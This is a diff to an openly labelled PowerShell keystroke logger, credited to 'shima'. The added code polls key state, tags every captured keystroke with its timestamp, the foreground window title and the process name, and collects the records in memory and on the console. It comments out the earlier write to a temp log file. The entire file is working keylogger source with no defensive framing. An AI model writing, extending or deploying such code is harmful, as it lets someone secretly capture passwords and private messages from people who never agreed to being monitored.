@@ -2,6 +2,17 @@
 PowerShell keystroke logger by shima
 http://vacmf.org/2013/01/23/powershell-keylogger/
 #>
+
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class UserWindows {
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+}
+"@            
+
+
 function KeyLog {
 	
 	# MapVirtualKeyMapTypes
@@ -65,6 +76,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	$getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
 	$getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
 
+    $strokes = @()
+
 	while ($true) {
 		Start-Sleep -Milliseconds 40
 		$gotit = ""
@@ -88,8 +101,32 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 				$unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
 				
 				if ($unicode_res -gt 0) {
-					$logfile = "$env:temp\key.log"
-					Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
+
+
+                    try {            
+                        $ActiveHandle = [UserWindows]::GetForegroundWindow()          
+                    } catch {            
+                        Write-Error "Failed to get active Window details. More Info: $_"            
+                    }
+
+                    $Process = Get-Process | ? {$_.MainWindowHandle -eq $activeHandle} 
+      
+                    
+                    $info = @{
+                        "Date" = Get-Date
+                        "ProcessName" = if ($Process.Name) { $Process.Name } else { "Unknown" }
+                        "MainWindowTitle" = if ($Process.MainWindowTitle) { $Process.MainWindowTitle } else { "Unknown" }
+                        "KeyPressed" = $mychar.ToString()
+                    }
+
+                    write-host "$($info.date) - Key [$($info.KeyPressed)] pressed within window [$($info.mainwindowtitle)] of process [$($info.processName)]."
+
+                    $strokes += New-Object -TypeName PSObject -Property $info                                                    
+
+
+#					$logfile = "$env:temp\key.log"
+#					Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
+
 				}
 			}
 		}
